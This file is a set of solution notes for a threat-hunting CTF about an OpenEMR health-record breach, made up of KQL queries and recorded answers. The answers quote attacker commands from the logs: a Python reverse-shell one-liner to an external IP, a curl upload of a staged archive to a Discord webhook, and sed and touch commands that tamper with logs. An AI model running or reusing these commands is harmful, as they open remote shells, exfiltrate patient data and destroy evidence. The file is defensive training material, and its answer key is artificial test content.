@@ -1,0 +1,714 @@
+//Q00 // Rocky Clinic // Mission Brief 10
+
+//INCIDENT LEAD: "Rocky Clinic ran quiet until it did not. No ransomware, no alerts, no outage, just an operator moving through the estate like they belonged. Read the brief, then acknowledge when you are ready to start."
+
+//==========================================================
+
+//LIVEHunt 07 // 01 - Asset Validation
+
+//01 // Rocky Clinic // Initial Asset Anchor 50
+//ROCKY CLINIC OPENEMR BREACH
+
+//Rocky Clinic runs OpenEMR, a cloud-hosted electronic health record platform. Earlier this month they identified a security incident. //The initial access path is unknown.
+
+//The intrusion ran across February 2026. No ransomware, no alerts, no outage. It began quietly. Early activity looked like ordinary administration but the pattern was deliberate enumeration of identities, data, and workflows, before a pivot to the underlying host.
+
+//Reconstruct how the compromise unfolded: what the attacker learned, how they expanded access, how it progressed from quiet exploration to full operational compromise.
+
+//📋 Open the operation brief
+
+//Investigation window: 4 to 14 February 2026 UTC.
+
+//What is the fully qualified device name of the system hosting the OpenEMR environment?
+
+//Format: Fully qualified domain name
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountDomain,Protocol, RemoteIP, RemoteDeviceName, RemotePort, AdditionalFields, ActionType
+| where  AccountDomain has_any ("open","rocky83","emr")
+| where ActionType contains "success"
+| sort by TimeGenerated asc 
+
+// answer : rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net | timestamp 2/5/2026, 12:16:40.294 AM --first success logon
+// I searched first for accountdomains and device names with rock or emr in them
+
+//accountDomain rocky83
+//remoteIP 68.53.47.150
+//{"Terminal":"ssh","PosixUserId":1000,"PosixPrimaryGroupName":"r0ckyyy335","PosixPrimaryGroupId":1000,"PosixSecondaryGroups":"[{\"Name\":\"adm\",\"PosixGroupId\":4},{\"Name\":\"systemd-journal\",\"PosixGroupId\":190}]","InitiatingAccountName":"r0ckyyy335","InitiatingAccountDomain":"rocky83","InitiatingAccountPosixUserId":1000,"InitiatingAccountPosixGroupName":"r0ckyyy335","InitiatingAccountPosixGroupId":1000}
+
+
+//==========================================
+
+//Q02 // Rocky Clinic // Hosting Model Confirmation  50
+//What container runtime hosts the OpenEMR application on rocky83?
+
+//(The cloud provider is Azure, but that is the infrastructure layer. We are asking about the layer that actually runs the OpenEMR application code.)
+
+//Format: Platform name, single word
+// hint : Command lines that reference the application also reveal its runtime.
+
+let logonTime = datetime(2/5/2026 12:16:40);
+DeviceProcessEvents
+| where TimeGenerated  between (logonTime .. datetime(2026-02-15))
+| where DeviceName contains "rocky83"
+| sort by TimeGenerated asc 
+
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountDomain,Protocol, RemoteIP, RemoteDeviceName, RemotePort, AdditionalFields, ActionType, InitiatingProcessCommandLine
+| where  AccountDomain has_any ("open","rocky83","emr")
+| where ActionType contains "success"
+| where InitiatingProcessCommandLine contains "docker"
+| sort by TimeGenerated asc 
+
+//===> docker  | timestamp 2/5/2026, 3:40:47.236 AM
+
+//========================================================
+
+//LIVEHunt 07 // 02 - Discovery
+
+// Q03 // Rocky Clinic // First Behavioural Tell 75
+//A suspicious remote logon onto rocky83 starts a new operator session in the investigation window. Within that session, identify the first command the operator runs to check who else is currently logged in.
+
+//Provide the process ID of that event.
+
+//Scope: host: rocky83  account: it.admin
+//the answer is in the SUSPICIOUS operator session (anchored by an external RemoteIP, not the routine internal admin activity)
+//investigation window: 4 to 14 February 2026 UTC
+//Format: Process ID (numeric)
+
+
+
+//| distinct InitiatingProcessId | sort by InitiatingProcessId asc 
+
+///2/7/2026, 12:23:55.562 AM
+
+
+let logonTime = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated  between (logonTime .. datetime(2026-02-15))
+//| where DeviceName contains "rocky83"
+| where AccountName has_any ("it.admin")
+| where InitiatingProcessCommandLine  has_any ("w","who","whoami","loginctl")
+| project TimeGenerated,DeviceName, AccountDomain,AccountName, ProcessCommandLine, ProcessId, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessAccountName,ProcessCreationTime
+| sort by TimeGenerated asc 
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountName,Protocol, RemoteIP, RemoteDeviceName, ActionType,InitiatingProcessId, InitiatingProcessParentId, InitiatingProcessCommandLine
+| where  AccountName  has_any ("it.admin")
+| where ActionType contains "success"
+//| where isnotempty( RemoteIP)
+| sort by RemoteIP , InitiatingProcessId asc 
+
+// ip 37.19.221.234 |PID 17334  |  2/8/2026, 4:25:00.555 PM
+
+//correlat time between table!!
+
+
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-08 4:25:00 ) .. datetime(2026-02-10))
+| where AccountName in ("it.admin","r0ckyyy335","it.admin")
+| where ProcessCommandLine has_any ("w", "who", "whoami", "loginctl")
+//| where InitiatingProcessId == 17507 or ProcessId == 17507
+| project TimeGenerated, ProcessCommandLine, ProcessId, InitiatingProcessId, InitiatingProcessCommandLine, AccountName, AdditionalFields
+| sort by TimeGenerated asc
+
+
+// Account names: root, it.admin, helpdesk.tier1,it.infra
+// r0ckyyy335
+
+// ANSWER: PID : 17507 | TIMESTAMP  2/8/2026, 4:25:30.735 PM
+
+
+//=======================================================
+
+//Q04 // Rocky Clinic // Session Boundary Fingerprint 75
+//Before disconnecting, an operator often runs one last interactive check that confirms state. In that same suspicious session as Q03, what is the SHA256 of the binary behind the last interactive operator command before session cleanup?
+
+//Scope:
+//host: rocky83
+//same operator session as Q03 (the one anchored by the external RemoteIP)
+//investigation window: 4 to 14 February 2026 UTC
+//Format: SHA256 (64-character hex)
+
+//==> 2/8/2026, 4:25:00.555 PM | rocky83 | it.admin | 37.19.221.234 | PID 17334
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-08 4:25:00) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountName,Protocol, RemoteIP, RemoteDeviceName, ActionType,InitiatingProcessId, InitiatingProcessParentId, InitiatingProcessCommandLine, InitiatingProcessSHA256
+| where  AccountName  has_any ("it.admin")
+//| where ActionType contains "success"
+//| where RemoteIP contains "37.19"
+| sort by TimeGenerated asc 
+
+
+// 2/8/2026, 4:39:17.433 PM rocky83 it.admin 149.40.62.16 LogonSuccess  20679 --- this is the next session start
+// we look for actions before this timestamp
+
+//todatetime('2026-02-08T16:25:00.555165Z')
+
+let time_window = datetime(2026-02-08T16:25:00.555165Z);
+DeviceProcessEvents
+| where TimeGenerated between (time_window.. (time_window + 15m))
+| where AccountName in ("it.admin")
+//| where ProcessCommandLine has_any ("w", "who", "whoami", "loginctl")
+//| where InitiatingProcessId == 17507 or ProcessId == 17507
+| project TimeGenerated, ProcessCommandLine, ProcessId, InitiatingProcessId, InitiatingProcessCommandLine, SHA256 , InitiatingProcessSHA256
+| sort by TimeGenerated asc
+
+// ANSWER : a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d
+// --> 2/8/2026, 4:35:08.887 PM docker ps 19800 19800 sudo docker ps  a7b78ff3f501951cd8455697ef1b6
+
+//=========================================================
+// Q05 // Rocky Clinic // Account Name Attribution
+//anomalous remote logons appear in the window. Identify the account name behind the suspicious remote sessions.
+
+//Format: Username
+
+//Unlock Hint for 0 points
+//Exclude the legitimate remote IPs you would expect in the environment.
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountName,Protocol, RemoteIP, RemoteDeviceName, ActionType,InitiatingProcessId, InitiatingProcessParentId 
+| where  DeviceName   has_any ("rocky83")
+| where ActionType contains "success"
+| where isnotempty( RemoteIP)
+//| where RemoteIP contains "37.19"
+| sort by TimeGenerated asc 
+| distinct AccountName
+
+// ANSWER: it.admin
+
+//==========================================================
+
+// Q06 // Rocky Clinic // Environment Confirmation 
+//In the first session the operator fingerprinted the host by reading release files under /etc. How many distinct /etc release files did they read in that single fingerprinting action?
+
+//Scope:
+
+//host: rocky83 (anchored in Q01)
+//investigation window: 4 to 14 February 2026 UTC
+//one fingerprinting action, count the distinct release files read in it
+//Format: Number (integer)
+
+let time_window = datetime(2026-02-08T16:25:00.555165Z);
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName in ("it.admin")
+| where ProcessCommandLine has "/etc/" and ProcessCommandLine has "release"
+| project TimeGenerated, ProcessCommandLine,   InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+// ANSWER 4 | 2/8/2026, 4:42:50.687 PM cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release -bash
+
+///==========================================================
+
+// Q07 // Rocky Clinic // Platform Reality Check 
+//What operating system distribution hosts the platform, as recorded by the EDR?
+
+//Format: Distribution name as recorded in DeviceInfo
+
+//Unlock Hint for 0 points The EDR records an OS distribution for every onboarded device.
+
+
+let time_window = datetime(2026-02-08T16:25:00.555165Z);
+let susp_time = datetime(2026-02-04);
+DeviceInfo
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where DeviceName contains "rocky83"
+| project TimeGenerated, OSDistribution, DeviceName, OSVersion
+
+//==> RockyLinux/
+
+///=============================================================
+// Q08 // Rocky Clinic // Crossing the Trust Line 50
+// The attacker drops the guardrails, moving from constrained admin into a fully privileged interactive shell. What input made that transition?
+
+// Format: Command with arguments
+
+
+let time_window = datetime(2026-02-08T16:25:00.555165Z);
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName in ("it.admin")
+| where ProcessCommandLine has_any ("sudo -i")
+| project TimeGenerated, ProcessCommandLine,   InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+// ANSWER sudo -i | 2/7/2026, 12:24:43.716 AM
+
+
+//===========================================
+//Q09 // Rocky Clinic // Runtime Layer Interrogation 
+//Straight after escalating, the operator checks control over the application's execution layer before touching data. What command interrogated the database container under full privilege?
+
+//Format: Full command as recorded in ProcessCommandLine
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where DeviceName  in ("rocky83")
+//| where AccountName contains "it.admin"
+| where ProcessCommandLine has_any ("docker inspect")
+| project TimeGenerated, ProcessCommandLine,   InitiatingProcessCommandLine, AccountName
+| sort by TimeGenerated asc
+
+// ==> docker inspect openemr-mariadb  -bash root | 2/9/2026, 5:03:14.124 PM
+
+
+//=================================
+// Q10 // Rocky Clinic // The Single File That Explains Everything
+75
+//Operators hunt one stable artifact that unlocks repeatable access: config, automation parameters, or secrets valid across reboots. What full command read the privileged automation configuration artifact?
+
+//Format: Full command as recorded in ProcessCommandLine
+
+//Unlock Hint for 0 points
+//Look for reads of config files outside the application's own directory.
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where DeviceName  in ("rocky83")
+| where AccountName contains "root"
+| where ProcessCommandLine has_all ("sed", "/etc/openemr")
+//| where ProcessCommandLine has "/etc/"
+| project TimeGenerated, ProcessCommandLine,   InitiatingProcessCommandLine, AccountName
+| sort by TimeGenerated asc
+
+// answer: sudo sed -n 1,200p /etc/openemr/audit_export.env  |  2/9/2026, 3:53:18.482 PM
+
+//=====================================================================
+
+//Q11 // Rocky Clinic // Physical Mapping Confirmation 
+//Logical abstractions are not enough. The attacker confirms where persistent data physically lives. Identify the action that recursively enumerates files inside Docker volume storage.
+
+//Format: Full command as recorded in ProcessCommandLine
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName in ("root")
+| where ProcessCommandLine has "find /var/lib/docker/volumes"
+| project TimeGenerated, ProcessCommandLine,   InitiatingProcessCommandLine, ProcessId
+| sort by TimeGenerated asc
+
+
+// ANSWER : find /var/lib/docker/volumes -maxdepth 3 -type f  | timestamp 2/10/2026, 6:37:30.981 AM
+
+//=============================================================================================
+
+//Q12 // Rocky Clinic // Where the Data Actually Lives 00
+//The attacker maps the logical database to physical storage on disk. What host filesystem path did they identify as the persistent database storage?
+
+//Format: Absolute filesystem path
+
+//Unlock Hint for 0 points
+//Docker volume names carry project identifiers, and the database volume references the DB engine.
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where DeviceName  in ("rocky83")
+| where ProcessCommandLine has "/var/lib/docker/volumes"
+| where ProcessCommandLine has_any ("mariadb", "mysql", "db")
+| project TimeGenerated, FolderPath,  ProcessCommandLine,   InitiatingProcessCommandLine, ProcessId
+| sort by TimeGenerated asc
+
+// ANSWER : /var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data | timepstamp 2/9/2026, 5:03:14.161 PM
+
+//=====================================================================
+
+//Q13 // Rocky Clinic // Hijacking a Trusted Repeating Path 
+//Rather than building new automation, the attacker targets something that already runs repeatedly without interactive logons. Identify the trusted operational script they tried to leverage for staging.
+
+//Format: Absolute filesystem path
+
+//Unlock Hint for 0 points
+//Operational scripts sit in predictable places. Look under /opt or /usr/local.
+
+
+
+let susp_time = datetime(2026-02-04);
+DeviceFileEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where DeviceName   in ("rocky83")
+| where FolderPath  has_any ("/opt/", "/usr/local/","openemr")
+| where   FileName  endswith ".sh"
+| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
+| sort by TimeGenerated asc 
+
+// ANSWER:  /opt/backup/scripts/backup_manifest.sh | TIMESTAMP 2/7/2026, 1:52:21.769 AM
+
+
+//===========================================
+
+// Q14 // Rocky Clinic // Staging Where Nobody Looks First 100
+//When the trust-abuse path got inconvenient, the attacker staged data somewhere that looks operational and draws no attention. Identify the directory used for staging prep.
+
+//Format: Absolute directory path
+
+//Unlock Hint for 0 points
+//Archive files are a staging tell. Find where they are being written.
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName    in ("root")
+| where DeviceName contains "rocky"
+| where  ProcessCommandLine    has_any ("tar","zip","7z","rar","xz","gzip") 
+| where  InitiatingProcessCommandLine    has_any ("cron","crond")
+| project TimeGenerated,  DeviceName,AccountName,  FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc 
+
+// ANSWER: /var/lib/integrations/ | timestamp 2/10/2026, 10:00:00.769 PM
+ 
+//=============================================================
+
+//Q15 // Rocky Clinic // Quiet Persistence Obfuscation 75
+
+//The simplest persistence is identity. The operator blends into the environment's assumptions. Identify the unauthorised account.
+
+//Format: Username
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountName,Protocol, RemoteIP, RemoteDeviceName, ActionType,InitiatingProcessId, InitiatingProcessParentId 
+| where  DeviceName   has_any ("rocky83")
+| where ActionType contains "success"
+| where isnotempty( RemoteIP)
+| sort by TimeGenerated asc 
+| distinct AccountName
+
+DeviceLogonEvents
+| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-15))
+| project TimeGenerated, DeviceName,AccountName,Protocol, RemoteIP, RemoteDeviceName, ActionType,InitiatingProcessId, InitiatingProcessParentId 
+| where  DeviceName   has_any ("rocky83")
+| where AccountName contains "system"
+| where isnotempty( RemoteIP)
+| sort by TimeGenerated asc 
+
+// ANSWER :  system
+
+
+
+//========================================
+
+// Q16 // Rocky Clinic // Identity Creation Without the Obvious Footprints 100
+//The attacker avoids the standard account-management tools to dodge easy detections, using a method that looks like maintenance. Provide the SHA256 of the binary used to create the identity.
+
+//Format: SHA256 (64-character hex)
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName    in ("root")
+| where DeviceName contains "rocky"
+| where  ProcessCommandLine    has_any ("/etc/passwd","/etc/shadow","etc/group") 
+| where  InitiatingProcessCommandLine      has_any ("vim","vipw")
+| project TimeGenerated,  DeviceName,AccountName,  FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, SHA256,InitiatingProcessSHA256
+| sort by TimeGenerated asc 
+
+// Answer  InitiatingProcessCommandLineSHA256 : dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0
+
+//=======================================================================
+// Q17 // Rocky Clinic // Secondary Non-Interactive Persistence 75
+
+//The attacker wants execution that does not depend on logging in: a lightweight host-level execution definition that fires reliably and blends in. Name the artifact.
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName    in ("root")
+| where DeviceName contains "rocky"
+| where  ProcessCommandLine    has_any ("/etc/systemd/system/") 
+//| where  InitiatingProcessCommandLine      has_any ("vim","vipw")
+| project TimeGenerated,  DeviceName,AccountName,  FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc 
+
+// ANSWER : integration-monitor.service | timestamp 2/10/2026, 5:07:22.408 PM
+
+//=======================================================
+
+//Q18 // Rocky Clinic // No Editor File Creation 75
+//The operator created the persistent artifact with a simple binary, avoiding distinctive editor telemetry. Identify the binary.
+
+//Format: Binary name
+
+//Unlock Hint for 0 points
+//File creation needs no editor. Some binaries leave minimal trace.
+
+
+let susp_time = datetime(2026-02-4);
+DeviceFileEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where DeviceName   in ("rocky83")
+| where InitiatingProcessCommandLine   has_any ("tee","cat","echo")
+| where FileName contains "integration-monitor.service"
+| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
+| sort by TimeGenerated asc 
+
+// ANswer : cat | query just gives a clue not the answer
+
+//=======================================================================
+//LIVEHunt 07 // 06 - Command and Control
+
+// Q19 // Rocky Clinic // Pre-Activation Integrity Check 100
+//Before activating outbound control, the attacker edits a launcher so it matches their intent. This is the arm-the-trap moment. What is the SHA256 of the service file version used to launch the C2 connection?
+
+//Format: SHA256 (64-character hex)
+
+//Unlock Hint for 0 points
+//The service file has more than one SHA256 across its life. Match the right version to the right moment.
+
+let susp_time2 = datetime(2026-02-04);
+let susp_time = datetime(2026-02-10T17:07:16.561766Z);
+DeviceFileEvents
+| where TimeGenerated between (susp_time2.. (susp_time2 + 10d))
+| where DeviceName   in ("rocky83")
+//| where InitiatingProcessCommandLine   has_any ("tee","cat","echo","vi")
+//| where FolderPath contains ".service"
+| where ActionType has_any ("FileRenamed","FileModified " )
+| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, SHA256,InitiatingProcessSHA256
+| sort by TimeGenerated asc 
+
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName    in ("root")
+| where DeviceName has "rocky83"
+| where  ProcessCommandLine    has_any ("curl","wget") 
+//| where  InitiatingProcessCommandLine      has_any ("vim","vipw")
+| project TimeGenerated, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc 
+
+// /bin/sh -c "wget --no-verbose --tries=1 --spider https://104.209.148.246:443 || exit 1"
+
+
+
+DeviceFileEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where DeviceName has "rocky83"
+| where FileName == "integration-monitor.service"
+| project TimeGenerated, FileName, ActionType, SHA256, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+// ANSWER f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8 | 2/11/2026, 4:16:01.991 AM
+
+//======================================================================
+// A one-liner establishes an interactive outbound connection to an external host. Identify the complete process command line that initiated it.
+
+//Format: Full command as recorded in ProcessCommandLine
+
+//Unlock Hint for 0 points
+//Python reverse shells use a small set of imports and a socket dup.
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where DeviceName has "rocky83"
+| where ProcessCommandLine has_any ("python", "python3")
+| where ProcessCommandLine has_any ("socket", "subprocess", "pty", "os.dup")
+| project TimeGenerated, ProcessCommandLine, SHA256, AccountName, ProcessId, InitiatingProcessParentId
+| sort by TimeGenerated asc
+
+// Answer: /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+//===================================
+
+//Q21 // Rocky Clinic // Reverse Shell Process Identification 50 ROCKY CLINIC OPENEMR BREACH
+
+//The attacker established outbound control by spawning a reverse shell. That reverse shell then opened an interactive session on the host. Provide the process ID of that interactive session.
+
+//Scope:
+
+//host: rocky83
+//account: it.admin
+//investigation window: 4 to 14 February 2026 UTC
+//the answer is the INTERACTIVE shell process spawned by the reverse shell, not the reverse shell process itself
+//Format: Process ID (numeric)
+
+//Unlock Hint for 0 points
+//The reverse shell spawns a subprocess. That is where the interactive session lives.
+
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-11T04:16:21Z) .. datetime(2026-02-11T04:17:00Z))
+| where DeviceName has "rocky83"
+| where ProcessCommandLine has "/bin/sh"
+| project TimeGenerated, ProcessCommandLine, ProcessId, InitiatingProcessId, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-11T04:16:00Z) .. datetime(2026-02-11T04:20:00Z))
+| where DeviceName has "rocky83"
+| where ProcessCommandLine has_any ("/bin/sh", "/bin/bash", "sh -i", "bash -i")
+| project TimeGenerated, ProcessCommandLine, ProcessId, InitiatingProcessId, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+//ANSWER ==> 8000 | 2/11/2026, 4:18:21.579 AM
+
+
+//=====================================================================
+
+//LIVEHunt 07 // 07 - Exfiltration
+
+//Q22 // Rocky Clinic // Staged Archive Identification 50
+//Before moving data, the attacker prepared an artifact for transfer. Identify its filename.
+
+//Format: Filename with extension
+
+//Unlock Hint for 0 points
+//Look for archive filenames referenced in the exfiltration telemetry.
+
+
+
+let susp_time = datetime(2026-02-04);
+DeviceProcessEvents
+| where TimeGenerated between (susp_time.. (susp_time + 10d))
+| where AccountName    in ("root")
+| where DeviceName has "rocky83"
+| where  ProcessCommandLine    has_any ("tar","zip","7z","rar","xz","gzip") 
+| where  ProcessCommandLine    has_any ("integration_state") 
+//| where  InitiatingProcessCommandLine    has_any ("cron","crond")
+| project TimeGenerated,  DeviceName,  FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc 
+
+
+// answer : integration_state_2026-02-10_22-00-01.tar.gz  | 2/10/2026, 10:00:00.829 PM
+
+//====================================================
+
+// Q23 // Rocky Clinic // First Exfiltration Attempt 100
+//Before succeeding, the operator tried a more structured transfer, but network controls interfered and forced a pivot. What initiating process command line is tied to the failed transfer?
+
+//Format: Full command as recorded in InitiatingProcessCommandLine
+
+//Unlock Hint for 0 points
+//Failed network events surface in the network table. Focus on ones whose parent process is the copy tool. | todatetime('2026-02-10T20:32:05.817506Z')
+
+
+
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
+| where DeviceName has "rocky83"
+| where ActionType == "ConnectionFailed"
+| where InitiatingProcessParentFileName contains "scp" 
+| project TimeGenerated, RemoteIP, RemotePort, ActionType, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessParentId
+| sort by TimeGenerated asc
+
+// answer: /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp
+//2/11/2026, 4:22:39.237 AM
+
+//===============================================================================
+
+//24 // Rocky Clinic // Successful Exfiltration Pivot 100
+//After the failed attempts the attacker pivots to a third-party SaaS platform to move the staged archive, and it works. What command line successfully transferred data out?
+
+//Format: Full command as recorded in InitiatingProcessCommandLine
+
+//Unlock Hint for 0 points
+//Attackers abuse legitimate SaaS to blend with normal traffic. The Linux tool of choice is simple.
+
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
+| where DeviceName has "rocky83"
+| where ActionType == "ConnectionSuccess"
+//| where InitiatingProcessParentFileName contains "scp" 
+| project TimeGenerated, RemoteIP, RemotePort, ActionType, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessParentId
+| sort by TimeGenerated asc
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where DeviceName has "rocky83"
+| where ProcessCommandLine has "discord"
+| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+// answer : curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/1471960320636620832/he162lRQsMJ3kKOVBNeiHYutbubwZ0sC-vq7A_phLZx-q4VOS88q4xDOvhxrBqy6nu9K
+
+// 2/13/2026, 8:10:51.284 PM
+
+//===============================
+
+//Q25 ip:port
+
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where DeviceName has "rocky83"
+| where InitiatingProcessCommandLine has "discord"
+| project TimeGenerated, RemoteIP, RemotePort, ActionType, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+//Q25 IP: PORT , 162.159.135.232:443
+
+//=========================================================
+//LIVEHunt 07 // 08 - Defense Evasion
+
+//26 // Rocky Clinic // Selective Log Erasure 100
+//Rather than wiping everything, the operator removes only certain traces, signalling deliberate cleanup. The selective deletions targeted multiple evidence categories across two system log files.
+
+//Scope:
+
+//host: rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net
+//logs in scope: /var/log/secure AND /var/log/messages
+//time: between 2026-02-11 16:13 and 16:16 UTC
+//How many distinct sed -i delete operations did the operator run across both log files combined?
+
+//Format: integer
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where DeviceName has "rocky83"
+| where ProcessCommandLine has_any ("/var/log/secure","/var/log/messages") and ProcessCommandLine contains "sed -i"
+| where ProcessCommandLine !contains "sudo"
+| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+| distinct ProcessCommandLine
+
+//ANSWER : 12 
+
+//===================================
+
+//Q27 Instead of a text editor, the attacker used one specific tool to manipulate the log files. Name the binary.
+
+//Format: Binary name ==> sed
+
+//=============================
+
+// Q28 The attacker backdated a log file to blur causality. What timestamp did they forge onto /var/log/messages?
+
+//Format: Date and time, YYYY-MM-DD HH:MM:SS
+
+
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where DeviceName has "rocky83"
+| where ProcessCommandLine has_any ("/var/log/messages") and ProcessCommandLine contains "touch"
+//| where ProcessCommandLine !contains "sudo"
+| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
+| sort by TimeGenerated asc
+
+
+// answer : 2026-02-06 12:00:00 | 2/11/2026, 4:16:47.127 PM
+
+
+
+//==============================
+//Q29  The EDR raised its own alert on the cleanup and timeline activity. What technique classification did that alert assign?
+
+//Format: Technique identifiers as recorded in the alert's AttackTechniques field
+
+AlertInfo
+| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-15))
+| where AttackTechniques has_any ("T1070", "T1099", "T1565")
+| project TimeGenerated,  AttackTechniques
+| sort by TimeGenerated asc
+
+// answser Indicator Removal (T1070)","Timestomp (T1070.006) 	| 2/11/2026, 4:16:01.993 AM
